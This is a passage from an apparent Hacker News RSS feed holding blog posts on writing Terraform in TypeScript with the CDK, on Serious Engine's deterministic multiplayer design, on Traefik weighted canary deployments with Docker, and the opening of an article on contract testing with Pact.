November 8, 2020 | https://jkrsp.com/writing-terraform-with-typescript/ | <a href="https://web.archive.org/web/*/https://jkrsp.com/writing-terraform-with-typescript/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>You may or may not have heard about the release of the <a href="https://github.com/hashicorp/terraform-cdk">terraform cdk</a> (short for cloud development kit). It’s HashiCorps answer to the aws cdk. In the words of the projects readme:</p>
<blockquote>
<p>CDK (Cloud Development Kit) for Terraform allows developers to use familiar programming languages to define cloud infrastructure and provision it through HashiCorp Terraform.</p>
</blockquote>
<p>Let’s try this out shall we?</p>
<p>To get the full developer experience, make sure you have <a href="https://github.com/Microsoft/TypeScript/wiki/TypeScript-Editor-Support">typescript support installed for your IDE</a></p>
<p><span>
      <a href="https://jkrsp.com/static/006a51697ab63c90c57788793394fd25/00172/cover.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="autocomplete-terraform" title="autocomplete-terraform" src="https://jkrsp.com/static/006a51697ab63c90c57788793394fd25/fcda8/cover.png" srcset="https://jkrsp.com/static/006a51697ab63c90c57788793394fd25/12f09/cover.png 148w,
https://jkrsp.com/static/006a51697ab63c90c57788793394fd25/e4a3f/cover.png 295w,
https://jkrsp.com/static/006a51697ab63c90c57788793394fd25/fcda8/cover.png 590w,
https://jkrsp.com/static/006a51697ab63c90c57788793394fd25/efc66/cover.png 885w,
https://jkrsp.com/static/006a51697ab63c90c57788793394fd25/00172/cover.png 1044w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
  </a>
    </span></p>
<h3>Generating the boilerplate</h3>
<p>Let’s open our terminal and install install cdktf-cli:</p>

<p>Next we’ll initialize the project</p>
<div data-language="bash"><pre><code><span>mkdir</span> hello-cdktf
<span>cd</span> hello-cdktf
cdktf init --template<span>=</span><span>"typescript"</span> --local</code></pre></div>
<p>Answer the two configuration questions and the project boilerplate will be generated.</p>
<p>Now we should see a <code>main.ts</code> file with the following contents in our folder:</p>
<div data-language="ts"><pre><code><span>import</span> <span>{</span> Construct <span>}</span> <span>from</span> <span>'constructs'</span><span>;</span>
<span>import</span> <span>{</span> App<span>,</span> TerraformStack <span>}</span> <span>from</span> <span>'cdktf'</span><span>;</span>

<span>class</span> <span>MyStack</span> <span>extends</span> <span>TerraformStack</span> <span>{</span>
  <span>constructor</span><span>(</span>scope<span>:</span> Construct<span>,</span> name<span>:</span> <span>string</span><span>)</span> <span>{</span>
    <span>super</span><span>(</span>scope<span>,</span> name<span>)</span><span>;</span>

    

  <span>}</span>
<span>}</span>

<span>const</span> app <span>=</span> <span>new</span> <span>App</span><span>(</span><span>)</span><span>;</span>
<span>new</span> <span>MyStack</span><span>(</span>app<span>,</span> <span>'hello-cdktf2'</span><span>)</span><span>;</span>
app<span>.</span><span>synth</span><span>(</span><span>)</span><span>;</span></code></pre></div>
<h3>Adding a provider package and importing modules from it</h3>
<p>After generation finishes you’ll see a message in the console listing instructions of what to do next. To add the prebuilt aws provider (which also gives us all the modules and types that we might want).</p>
<div data-language="bash"><pre><code><span>npm</span> <span>install</span> -a @cdktf/provider-aws</code></pre></div>
<p>Now you can import modules from <code>@cdktf/provider-aws</code> such as <code>AwsProvider</code> and others. We’ll go for the <code>AwsProvider</code>, <code>LambdaFunction</code> and <code>IamRole</code>. Add this at the top of your file:</p>
<div data-language="ts"><pre><code><span>import</span> <span>{</span> AwsProvider<span>,</span> LambdaFunction<span>,</span> IamRole <span>}</span> <span>from</span> <span>'@cdktf/provider-aws'</span><span>;</span></code></pre></div>
<p>and then create an AwsProvider in your stack:</p>
<div data-language="ts"><pre><code><span>new</span> <span>AwsProvider</span><span>(</span><span>this</span><span>,</span> <span>'aws'</span><span>,</span> <span>{</span>
  region<span>:</span> <span>'eu-west-2'</span>
<span>}</span><span>)</span></code></pre></div>
<h3>Adding a lambda function to our stack</h3>
<p>To create a lambda we need to define an IAM role at first. Boring, but made easier by autocomplete of cours. Anyway here’s the default policy:</p>
<div data-language="ts"><pre><code><span>const</span> roleForLambda <span>=</span> <span>new</span> <span>IamRole</span><span>(</span><span>this</span><span>,</span> <span>'iam-role-for-lambda'</span><span>,</span> <span>{</span>
  name<span>:</span> <span>'iam-role-for-lambda'</span><span>,</span>
  assumeRolePolicy<span>:</span> <span>JSON</span><span>.</span><span>stringify</span><span>(</span><span>{</span>
    <span>"Version"</span><span>:</span> <span>"2012-10-17"</span><span>,</span>
    <span>"Statement"</span><span>:</span> <span>[</span>
      <span>{</span>
        <span>"Action"</span><span>:</span> <span>"sts:AssumeRole"</span><span>,</span>
        <span>"Principal"</span><span>:</span> <span>{</span>
          <span>"Service"</span><span>:</span> <span>"lambda.amazonaws.com"</span>
        <span>}</span><span>,</span>
        <span>"Effect"</span><span>:</span> <span>"Allow"</span>
      <span>}</span>
    <span>]</span>
  <span>}</span><span>)</span>
<span>}</span><span>)</span></code></pre></div>
<p>Now we can add a lambda function to the stack like this:</p>
<div data-language="typescript"><pre><code><span>new</span> <span>LambdaFunction</span><span>(</span><span>this</span><span>,</span> <span>'hello-world'</span><span>,</span> <span>{</span>
  filename<span>:</span> process<span>.</span><span>cwd</span><span>(</span><span>)</span> <span>+</span> <span>'hello-world.zip'</span>
  functionName<span>:</span> <span>'hello-world'</span><span>,</span>
  handler<span>:</span> <span>'index.handler'</span><span>,</span>
  runtime<span>:</span> <span>'nodejs12.x'</span><span>,</span>
  role<span>:</span> roleForLambda<span>.</span>arn<span>,</span>
<span>}</span><span>)</span></code></pre></div>
<p>You will need to zip your lambda function - which is usually a separate step before running terraform. For example sake, let’s say you have a file in your project named <code>hello-world.js</code>:</p>
<div data-language="js"><pre><code><span>export</span> <span>const</span> <span>handler</span> <span>=</span> <span>async</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>
  <span>return</span> <span>{</span> hello<span>:</span> world <span>}</span>
<span>}</span></code></pre></div>
<p>Then zip your lambda <code>zip -r lambda.zip hello-world.js</code></p>
<h3>Deploying your stack</h3>
<p>Before you deploy don’t forget need to <a href="https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-files.html">have your aws credentials in your path</a>.</p>
<p>Now that you have everything ready you can deploy your stack with <code>cdktf deploy</code>. This command will display an execution plan and ask you if you want to deploy. Press the <code>Y</code> and <code>Enter</code> key to deploy.</p>
<p>Any errors at this stage should be farely self-explanatory. If they don’t make sense, google the error message - other people have likely run into the same problem.</p>
<hr>
<p>If you’re a terraform user and you’ve used the <code>lambda_function</code> module before, you’ll notice that the configuration is exactly the same.</p>
<p>Ultimately, when you run <code>cdktf synth</code> cdktf compiles your javascript/typescript modules into terraforms alternative <a href="https://www.terraform.io/docs/configuration/syntax-json.html"><code>JSON</code> configuration syntax</a>.</p>
<p>This is an extremely powerful feature of terraform’s design since it can be a compile target not just for javascript and typescript, but any kind of language. The open source community could add it’s own language compilers.</p>
<p>Why not write one in rust? 😅</p></section></div>]]>
            </description>
            <link>https://jkrsp.com/writing-terraform-with-typescript/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25025186</guid>
            <pubDate>Sun, 08 Nov 2020 12:00:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Serious Engine – Multiplayer Explained]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25025148">thread link</a>) | @sklopec
<br/>
November 8, 2020 | https://staniks.github.io/articles/serious-engine-networking-analysis.html | <a href="https://web.archive.org/web/*/https://staniks.github.io/articles/serious-engine-networking-analysis.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
<p><img src="https://staniks.github.io/img/articles/serious-engine/banner.jpg" alt="Banner" title="Banner"></p>

<p>Croteam released the <a href="https://github.com/Croteam-official/Serious-Engine">Serious Engine 1 source code</a> under GNU GPL v2 in 2016, and I've wanted to check it out for quite a while now. My observations here are based on reading and debugging this particular codebase and not reverse-engineering the classics released on GOG and Steam. Keep in mind that comments in code snippets have been replaced to provide more context. Also, some of my conclusions here may be wrong, so you can send me a message over at <a href="https://twitter.com/Sklopec">@Sklopec</a> if you feel like something needs correction.</p>

<blockquote>
  <p><strong>NOTE:</strong> <em>This isn't an in-depth technical analysis, but an overview with more focus on the concepts rather than the implementation. I have skipped over a lot of things for the sake of simplicity. Also, the following sections assume you have at least a vague idea of how Serious Sam looks and plays.</em></p>
</blockquote>







<ul>
<li><strong>2020-11-05</strong> - published.</li>
</ul>



<hr>

<p><strong>Serious Sam</strong> was built from the ground up as a multiplayer game. In a way, it's multiplayer even when you're playing the singleplayer campaign. While this idea may seem unusual at first, it's really just a clever way of abstraction. Let's explore how it works.</p>

<p>Serious Engine supports:</p>

<ul>
<li>singleplayer - offline campaign</li>
<li>multiplayer - online, LAN or local co-op and various game modes
<ul>
<li>supports multiple players on the same client via split-screen!</li>
</ul></li>
<li>demo recording and playback</li>
</ul>

<p>Let's look at the demo functionality first. Serious Engine allows recording and reproduction of gameplay clips or <em>demos</em>. Both multiplayer and singleplayer game sessions can be recorded. In order to record a game, the most naive solution would be to persist the game state of every tick into a file.</p>

<p>However, such an approach has a problem - demo files would be ridiculously large.</p>

<p>Instead, Serious Engine records the entire game state at the beginning of the recording, and then, each tick, records something called <strong>game stream blocks</strong>. For now, think of these as messages which describe events in the game. They can be of these types:</p>

<pre><code>MSG_SEQ_ALLACTIONS,      // Player actions. See below.
MSG_SEQ_ADDPLAYER,       // Add a new player to the game.
MSG_SEQ_REMPLAYER,       // Remove a player from the game.
MSG_SEQ_PAUSE,           // Pause or unpause the game.
MSG_SEQ_CHARACTERCHANGE, // Change an aspect of player's character.
</code></pre>

<p>It's not important that you understand these context of these message types right now - we'll get to that later. For now, let's focus on message type <code>MSG_SEQ_ALLACTIONS</code>, because this is key to understanding how the whole thing works. This particular message type is processed in <code>CSessionState::ProcessGameTick</code>:</p>

<pre><code>FOREACHINSTATICARRAY(ses_apltPlayers, CPlayerTarget, itplt) {
    if (itplt-&gt;IsActive()) {
        // Extract action from message passed as parameter.
        CPlayerAction paAction;
        nmMessage&gt;&gt;paAction;

        // Apply the action to the CPlayerTarget.
        itplt-&gt;ApplyActionPacket(paAction);
    }
}
</code></pre>

<p>The engine deserializes several <code>CPlayerAction</code> objects from the message, one for each active player (since multiplayer games can be recorded as well), and applies these packets. Let's take a look at the <code>CPlayerAction</code> class to see what these packets actually are.</p>

<pre><code>class ENGINE_API CPlayerAction {
public:
    FLOAT3D pa_vTranslation;
    ANGLE3D pa_aRotation;
    ANGLE3D pa_aViewRotation;
    ULONG   pa_ulButtons;
    __int64 pa_llCreated;

    // ...
}
</code></pre>

<p><code>CPlayerAction</code> describes the player's state:</p>

<ul>
<li>player character velocity in world-space (<code>pa_vTranslation</code>)</li>
<li>player character rotation in world-space (<code>pa_aRotation</code>)</li>
<li>player view rotation in world-space (<code>pa_aViewRotation</code>)</li>
<li>buttons currently held down (<code>pa_ulButtons</code>, application defined, independent of control mapping scheme)</li>
<li>timestamp in milliseconds (<code>pa_llCreated</code>, from <a href="https://en.wikipedia.org/wiki/Time_Stamp_Counter">TSC</a>)</li>
</ul>

<p>These messages are generated by the Engine each tick during gameplay as the player interacts with the game (presses buttons, moves the mouse and/or thumbsticks). The messages are continuously serialized during recording and written into the demo file.</p>

<p>So how does reproduction work? The idea is simple - the Engine assumes everything in the game is completely predictable, and the players are the only ones with the power to change things. So in order to record the demo, the Engine only needs to record the entire game state once, and then only record the actions players perform each tick. In order to perform playback, the Engine deserializes the initial game state from the demo file, and then deserializes and applies player actions each tick as if the player was playing the game.</p>

<p>Neat, isn't it?</p>

<p>There's a caveat, though - <strong>this means the Engine's game model has to be completely deterministic.</strong> And it is. You can see an example of this if you peek into the <code>CEntity</code> implementation:</p>

<pre><code>ULONG CEntity::IRnd(void)
{
    return ((_pNetwork-&gt;ga_sesSessionState.Rnd()&gt;&gt;(31-16))&amp;0xFFFF);
}
</code></pre>

<p>where <code>CSessionState::Rnd()</code> is a pseudo-random number generator whose seed is part of the game state and is therefore initialized during game state deserialization:</p>

<pre><code>void CSessionState::Read_t(CTStream *pstr)  // throw char *
{
    // ...
    (*pstr)&gt;&gt;ses_ulRandomSeed;
    // ...
</code></pre>

<p>This makes sure the Engine is able to reproduce the exact same scenario every time we play the demo. If we would, say, use a truly random number generator for some game logic, or even a pseudo-random generator with differing seed, we would get different results every time - the famous <strong>desynchronization</strong>.</p>

<h2>Floating Point Determinism <a name="floating-point-determinism"></a></h2>

<p>There's also the matter of potential desynchronization due to floating point numbers. However, since Serious Sam on PC was originally released on Windows only, they could get away with using one compiler for everything, thus eliminating any sync issues that would emerge due to differences in C runtime library, like different implementations of trigonometry functions.</p>

<p>Similar issues can also arise due to differences in FPU precision. For example, the renderers are DLLs, and different clients might use different renderers. Renderers call various APIs (OpenGL, DirectX), and function calls in some of them might set FPU precision to different than expected. Serious Engine seems to have that covered as well. You can see precision guards like these, sprinkled around:</p>

<pre><code>CSetFPUPrecision FPUPrecision(FPT_24BIT);
</code></pre>

<p>Upon this object's construction, <code>_control87</code> function (MSVC specific) is used to cache the current FPU precision, then apply the new one. Once the object goes out of scope, the cached FPU precision is restored.</p>

<p>In theory, problems like these could also occur due to rounding control, but I haven't seen it explicitly set anywhere in the engine. There's this assert though, but this is just a query.</p>

<pre><code>ASSERT((_controlfp(0, 0)&amp;_MCW_RC)==_RC_NEAR);
</code></pre>

<p>Maybe it just wasn't that big of a deal - perhaps the rounding differences would be small enough not to accumulate significantly over the relatively short time that a session lasts, and thus, not produce any noticeable desynchronization.</p>

<h2>Tick vs. Frame <a name="tick-vs-frame"></a></h2>

<p>Notice how I use the word <strong>tick</strong> instead of <strong>frame</strong>. This is because the game logic tickrate is decoupled from the rendering framerate. Rendering framerate varies depending on the hardware and settings, but seems to be capped at <strong>500 frames per second</strong> internally. However, the game logic rate is constant and limited to <strong>20 ticks per second</strong>. But why do we see smooth movement and animation?</p>

<p><strong>Interpolation</strong>. Serious Engine interpolates between the current and the previous game tick based on time passed between. Try opening the in-game console (<code>~</code> key) and typing this to see how the game looks and feels without interpolation:</p>

<pre><code>/net_bLerping=0
</code></pre>

<p>It's kind of like playing a modern console exclusive. So how does Serious Engine smooth this out?</p>

<p>Animations and movement are interpolated with simple linear interpolation (lerp):</p>

<pre><code>interpolated_state = old_state + (new_state - old_state) * factor;
</code></pre>

<p>where <code>factor</code> is a floating point value in range <code>[0.0f, 1.0f]</code>. The factor in a particular moment in time is calculated as follows (pseudocode):</p>

<pre><code>// Time is in seconds.
float real_delta = time_since_session_started;
float tick_delta = time_of_last_tick - time_of_first_tick;

// 20 FPS logic framerate.
static constexpr float tick_quantum = 1 / 20.0f;

float factor2 = 1.0f - (tick_delta - real_delta) / tick_quantum;
</code></pre>

<p>Or illustrated, if don't mind my terrible handwriting...</p>

<p><img src="https://staniks.github.io/img/articles/serious-engine/frametick.png" alt="Ticks explained" title="Ticks explained"></p>

<p>You can also see the implementation in <code>CSessionState::SetLerpFactor</code>. You will notice there are two interpolation (<code>Lerp</code>) factors - one is for predicted movement, and one is for non-predicted. For now, don't worry about predicted movement - we'll get to prediction and explain how it works later.</p>

<p>Now that we've covered the basic concept of the demo recording and reproduction, think about this: instead of recording the course of the game into a file to be reproduced later, we could send it over the network to be reproduced in real time as we play the game with another person. That is the basic idea of Serious Engine multiplayer.</p>



<hr>

<p>Unfortunately, the internet is a much more complicated environment than a file on your disk drive. Serious Sam is a fast paced game, and making things work fast over the internet is somewhat tricky, especially if you consider the fact that Serious Sam came out in the early 2000s, when a noticeable amount of people were still using 56k modems.</p>

<p>As you may have already guessed, Serious Sam employs a multiplayer model in which every player runs their own simulation and merely receives instructions on what the players have done, much like the demo system. If you glance at the code, you might see function names like <code>CNetworkLibrary::StartPeerToPeer_t</code>, but this is somewhat misleading - Serious Sam's networking isn't really peer to peer, even though the logic is processed akin to the old lockstep multiplayer games.</p>

<p>Serious Engine's networking model is actually client-server.</p>

<p>The basic idea is that, for a single multiplayer session, there is a single server, and the clients connect to it. The server receives messages from clients, …</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://staniks.github.io/articles/serious-engine-networking-analysis.html">https://staniks.github.io/articles/serious-engine-networking-analysis.html</a></em></p>]]>
            </description>
            <link>https://staniks.github.io/articles/serious-engine-networking-analysis.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25025148</guid>
            <pubDate>Sun, 08 Nov 2020 11:54:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Traefik: Canary deployments with weighted load balancing]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25024861">thread link</a>) | @kiyanwang
<br/>
November 8, 2020 | https://iximiuz.com/en/posts/traefik-canary-deployments-with-weighted-load-balancing/ | <a href="https://web.archive.org/web/*/https://iximiuz.com/en/posts/traefik-canary-deployments-with-weighted-load-balancing/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><a name="cut"></a>
<a href="https://containo.us/traefik/">Traefik</a> is <del>The Cloud Native Edge Router</del> yet another reverse proxy and load balancer. Omitting all the cloud-native buzzwords, what really makes Traefik different from Nginx, HAProxy, and alike is the automatic and dynamic configurability it provides out of the box. And the most prominent part of it is probably its ability to do automatic service discovery. If you put Traefik in front of <a href="https://docs.traefik.io/providers/overview/#supported-providers">Docker, Kubernetes, or even an old-fashioned VM/bare-metal deployment</a> and show it how to fetch the information about the running services, it'll automagically expose them to the outside world. If you follow some conventions of course...<a name="eofcut"></a></p>
<h2 id="weighted-load-balancing">Weighted load balancing</h2>
<p>If you have a fairly small deployment, up to a single-digit number of machines, and for some reason, you cannot jump into the clouds and enjoy the <a href="https://aws.amazon.com/fargate/">serverless containers</a>, combining Docker and Traefik is an ideal choice. For deployments of such scale using a full-fledged orchestrator like Kubernetes or Mesos would be overkill due to the resource requirements and the inherent complexity of the orchestrator itself. But the fact that we are going to stick with the poor man's solution doesn't mean that we don't want to benefit from the modern development best practices.</p>
<p>So, for simplicity, imagine, we have just one machine. There is a Docker daemon running on it and a <code>traefik</code> container listening on the host's port <em>80</em> (or <em>443</em>, whatever). And we want to deploy our service on that machine. However, we would also like to release the new versions safely by applying the <a href="https://martinfowler.com/bliki/CanaryRelease.html">canary deployment technique</a>:</p>
<p><img src="https://iximiuz.com/traefik-canary-deployments-with-weighted-load-balancing/05-traefik-canary-single-box.png" width="80%">
</p>

<p>Thus, we need to get Traefik to do the weighted load balancing between the Docker containers of the same service. If we could solve the load balancing problem on a single machine, we would simply scale it out to the rest of the fleet:</p>
<p><img src="https://iximiuz.com/traefik-canary-deployments-with-weighted-load-balancing/07-traefik-canary-many-boxes.png" width="80%">
</p>

<p>If every instance of the <em>traefik</em> proxy gets more or less the same number of requests we could achieve the desired share of the canary requests across the whole fleet.</p>
<h2 id="not-invented-here-traefik-v1-vs-traefik-v2">Not invented here (Traefik v1 vs Traefik v2)</h2>
<p>All that proxy kind of software architecturally looks more or less the same. There is always:</p>
<ul>
<li>a front end component dealing with the incoming requests from clients;</li>
<li>an intermediary pipeline dealing with requests transformations;</li>
<li>a back end component dealing with the outgoing requests to upstream services.</li>
</ul>
<p>Every service proxy calls these parts in its own way (<em>entrypoint</em>, <em>server</em>, <em>virtual host</em>, <em>listener</em>, <em>filter</em>, <em>middleware</em>, <em>upstream</em>, <em>endpoint</em>, etc) but Traefik folks went even further...</p>
<p>Historically, Traefik was using <code>entrypoint -&gt; frontend -&gt; backend</code> model:</p>


<p>However, <a href="https://containo.us/blog/back-to-traefik-2-0-2f9aa17be305/">in 2019 the new Traefik major version has been announced</a> bringing a breaking configuration change and a refined approach:</p>


<p>So, in Traefik 2 instead of <em>frontends</em> and <em>backends</em>, we now have <em>routers</em> and <em>services</em>. And there is also an explicit layer of <em>middleware</em> components dealing with extra request transformations. Well, makes perfect sense! But if the v1 documentation basically <a href="https://docs.traefik.io/v1.7/basics/">starts from the architectural overview</a> making the further reading much simpler, in the case of v2 you need to dig down to the <a href="https://docs.traefik.io/routing/overview/">Routing</a> or <a href="https://docs.traefik.io/middlewares/overview/">Middleware</a> concepts to get the first decent diagrams (even though I found all the preceding illustrations very entertaining).</p>
<p>For the newcomers trying to configure Traefik following blog posts on the Internet (well, how doesn't?), beware - as of Q3 2020 most of the articles show the Traefik v1 examples. Config snippets from those articles will simply not work with the Traefik v2 release (often silently). There is a <a href="https://docs.traefik.io/migration/v1-to-v2/">migration page</a> in the official documentation, although IMO it lacks visual representation of the change.</p>
<h2 id="weighted-load-balancing-with-traefik-1">Weighted load balancing with Traefik 1</h2>
<p>Apparently, it <del>is</del> was super simple. First, run the <code>traefik:v1.7</code> container with Docker provider:</p>
<pre><code>docker run -d --rm \
  --name traefik-v1.7 \
  -p 9999:80 \
  -v /var/run/docker.sock:/var/run/docker.sock \
  traefik:v1.7 \
    --docker \
    --docker.exposedbydefault=false</code></pre>
<p>And since it's a v1, we'd need to think in terms of <em>frontends</em> and <em>backends</em>. Apparently, every container would become a server of a particular <em>backend</em>. Conveniently, <a href="https://docs.traefik.io/v1.7/configuration/backends/docker/">the weight of the server could be assigned</a> using <code>traefik.weight</code> label:</p>
<pre><code># Run the current app version (weight 40)
docker run -d --rm --name app_normal \
  --label "traefik.enable=true" \
  --label "traefik.backend=app_weighted" \
  --label "traefik.frontend.rule=Host:example.local" \
  --label "traefik.weight=40" \
  nginx:1.19.1

# Run the contender version (weight 10)
docker run -d --rm --name app_canary \
  --label "traefik.enable=true" \
  --label "traefik.backend=app_weighted" \
  --label "traefik.frontend.rule=Host:example.local" \
  --label "traefik.weight=10" \
  nginx:1.19.2</code></pre>
<p>Send some traffic, just to make sure that it works:</p>
<pre><code>for i in {1..100}; do curl -s -o /dev/null -D - -H Host:example.local localhost:9999 | grep Server; done | sort | uniq -c

&gt;  80 Server: nginx/1.19.1
&gt;  20 Server: nginx/1.19.2</code></pre>
<p>Perfect, 20 out of 100 requests have been served by the canary release container. And if we don't need the canary at some point in time, we can simply stop the container:</p>
<pre><code>docker stop app_canary</code></pre>
<p>Now, if you repeat the traffic probe, 100% of the requests will be served by the <code>app_normal</code> container:</p>
<pre><code>for i in {1..100}; do curl -s -o /dev/null -D - -H Host:example.local localhost:9999 | grep Server; done | sort | uniq -c

&gt;  100 Server: nginx/1.19.1</code></pre>
<p>Easy-peasy, right?</p>
<h2 id="weighted-load-balancing-with-traefik-2">Weighted load balancing with Traefik 2</h2>
<p>And that's where things start getting more complicated... After thoroughly studying the v2 docs, I could not find the <code>weight</code> directive anymore. The closest thing I was able to find was the <a href="https://docs.traefik.io/routing/services/#weighted-round-robin-service">Weighted Round Robin Service</a> (WRR):</p>
<blockquote>
<p>The WRR is able to load balance the requests between multiple services based on weights.</p>
</blockquote>
<p>But there is a couple of limitations with it:</p>
<blockquote>
<ul>
<li>This strategy is only available to load balance between <strong>services</strong> and not between <strong>servers</strong>.</li>
<li>This strategy can be defined currently with the <strong>File</strong> or <strong>IngressRoute</strong> providers.</li>
</ul>
</blockquote>
<p>I.e. no Docker provider support and no direct weight assignment to servers (i.e. containers).</p>
<p>Well, let's try to be creative. Excluding IngressRoute provider (sounds like a Kubernetes thing), we basically have only one option to define WRR service - the File provider. What if we combine it with the Docker provider?</p>
<p>First, define a WRR service in the file:</p>
<pre><code>cat &lt;&lt; "EOF" &gt; file_provider.yml
---
http:
  routers:
    router0:
      service: app_weighted
      rule: "Host(`example.local`)"
  services:
    app_weighted:
      weighted:
        services:
          - name: app_normal@docker  # I'm not defined yet
            weight: 40
          - name: app_canary@docker  # Neither do it
            weight: 10
EOF</code></pre>
<p>Notice, that we haven't defined any <strong>servers</strong> (i.e. containers) there. Instead, we defined an <code>app_weighted</code> service in terms of its sub-services - <code>app_normal</code> and <code>app_canary</code> (there is <code>@docker</code> suffix to say that these services are expected to be defined by the Docker provider).</p>
<p>Let's start the <code>traefik:v2.2</code> container with the Docker and file providers:</p>
<pre><code>docker run -d --rm --name traefik-v2.2 \
  -p 9999:80 \
  -v /var/run/docker.sock:/var/run/docker.sock \
  -v `pwd`:/etc/traefik_providers \
  traefik:v2.2 \
    --providers.docker \
    --providers.docker.exposedbydefault=false \
    --providers.file.filename=/etc/traefik_providers/file_provider.yml</code></pre>
<p>Now, it's time to launch the application containers. Since it's the v2, we need to think in terms of <em>routers</em> and <em>services</em> while <a href="https://docs.traefik.io/reference/dynamic-configuration/docker/">configuring</a> the container labels:</p>
<pre><code># Run the current app version (weight 40)
docker run -d --rm --name app_normal_01 \
  --label "traefik.enable=true" \
  --label "traefik.http.services.app_normal.loadbalancer.server.port=80" \
  --label "traefik.http.routers.app_normal_01.entrypoints=traefik" \
  nginx:1.19.1

# Run the contender version (weight 10)
docker run -d --rm --name app_canary_01 \
  --label "traefik.enable=true" \
  --label "traefik.http.services.app_canary.loadbalancer.server.port=80" \
  --label "traefik.http.routers.app_canary_01.entrypoints=traefik" \
  nginx:1.19.2</code></pre>
<p>Let's try to understand the reasoning behind these labels. In general, launching a container means creating a single-server service. If we don't ask otherwise, Traefik 2 implicitly creates such a service using the container's name (replacing <code>_</code> with <code>-</code> for some reasons). On top of that, it adds a routing rule <code>Host(`&lt;container-name-goes-here&gt;`)</code>.</p>
<p>But in our case, we don't want to have arbitrary services for our containers. Instead, we know exactly the name of the service for the normal app containers (<code>app_normal</code>) and the name of the service for the canary app containers (<code>app_canary</code>). Thus, we need to somehow bind the containers (i.e. servers) to the desired services. And a somewhat <em>hacky</em> way of doing that is by using <code>traefik.http.services.&lt;service-name&gt;.loadbalancer.server.port=80</code> label. We don't really need to specify the port here because Traefik would figure it out by itself. But doing so allows us to introduce the <code>app_normal</code> and <code>app_canary</code> services and put the containers in there.</p>
<p>For the second label, remember the default routing rule <code>Host(`&lt;container-name-goes-here&gt;`)</code> that gets assigned to every container automatically? To avoid these containers being accidentally exposed to the outside world, we use the label <code>traefik.http.routers.&lt;stub&gt;.entrypoints=traefik</code>. It's just another hack, binding the containers to the internal <code>entrypoint</code> called <code>traefik</code>. This entrypoint is used for the Traefik's admin API and dashboard and should not be exposed publicly in production environments.</p>
<p>Finally, let's send some traffic, just to make sure that it works:</p>
<pre><code>for i in {1..100}; do curl -s -o /dev/null -D - -H Host:example.local localhost:9999 | grep Server; done | sort | uniq -c

&gt;  80 Server: nginx/1.19.1
&gt;  20 Server: nginx/1.19.2</code></pre>
<p>Great! But what if we need to stop the canary containers? If we just do it right away, the <code>app_weighted@file</code> service will stop functioning due to the disappeared <code>app_canary</code> service. Likely, even the File is <a href="https://docs.traefik.io/reference/dynamic-configuration/file/">a dynamic …</a></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://iximiuz.com/en/posts/traefik-canary-deployments-with-weighted-load-balancing/">https://iximiuz.com/en/posts/traefik-canary-deployments-with-weighted-load-balancing/</a></em></p>]]>
            </description>
            <link>https://iximiuz.com/en/posts/traefik-canary-deployments-with-weighted-load-balancing/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25024861</guid>
            <pubDate>Sun, 08 Nov 2020 10:57:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Contract Testing for Node.js Microservices with Pact]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25024836">thread link</a>) | @kiyanwang
<br/>
November 8, 2020 | https://codersociety.com/blog/articles/contract-testing-pact | <a href="https://web.archive.org/web/*/https://codersociety.com/blog/articles/contract-testing-pact">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Contract testing helps ensure the compatibility of microservices and decouples the development and deployment processes of software teams. In this article, you'll learn more about contract testing and how to use Pact to verify and ensure your Node.js microservices' API compatibility.</p><div><div><h2 id="ensuring-api-compatibility-in-distributed-systems"><span>Ensuring API compatibility in distributed systems</span></h2><p>The use of microservices is growing in popularity for good reasons. They allow software teams to develop, deploy, and scale software independently to deliver business value faster. Large software projects are broken down into smaller modules, which are easier to understand and maintain. While the internal functionality of each microservice is getting simpler, the complexity in a microservice architecture is moved to the communication layer and often requires the integration between services.</p><p>However, in microservice architectures, you often find service to service communication, leading to increased complexity in the communication layer and the need to integrate other services.</p><p><img src="https://cdn.codersociety.com/uploads/amazon-netflix-services.png">
<em>Figure 1: Distributed systems at Amazon and Netflix</em></p><p>Traditional <a href="https://martinfowler.com/articles/microservice-testing/#testing-integration-introduction">integration testing</a> has proven to be a suitable tool to verify the compatibility of components in a distributed system. However, as the number of services increases, maintaining a fully integrated test environment can become complex, slow, and difficult to coordinate. The increased use of resources can also become a problem, for example when starting up a full system locally or during continuous integration (CI). Contract testing aims to address these challenges – let's find out how.</p><h2 id="what-is-contract-testing"><span>What is contract testing?</span></h2><p>Contract testing is a technique for checking and ensuring the interoperability of software applications in isolation and enables teams to deploy their microservices independently of one another. Contracts are used to define the interactions between API consumers and providers. The two participants must meet the requirements set out in these contracts, such as endpoint definitions and request and response structures.</p><p><img src="https://cdn.codersociety.com/uploads/contract-testing.png">
<em>Figure 2: A contract that defines a HTTP GET interaction</em></p><h2 id="what-is-consumer-driven-contract-testing"><span>What is consumer-driven contract testing?</span></h2><p>Consumer-driven contract testing allows developers to start implementing the consumer (API client) even though the provider (API) isn’t yet available. For this, the consumer writes the contract for the API provider using <a href="https://martinfowler.com/bliki/TestDouble.html">test doubles</a> (also known as API mocks or stubs). Thanks to these test doubles, teams can decouple the implementation and testing of consumer and provider applications so that they’re not dependent on each other. Once the provider has verified its structure against the contract requirements, new consumer versions can be deployed with confidence knowing that the systems are compatible.</p><p><img src="https://cdn.codersociety.com/uploads/consumer-driven-contract-testing.png">
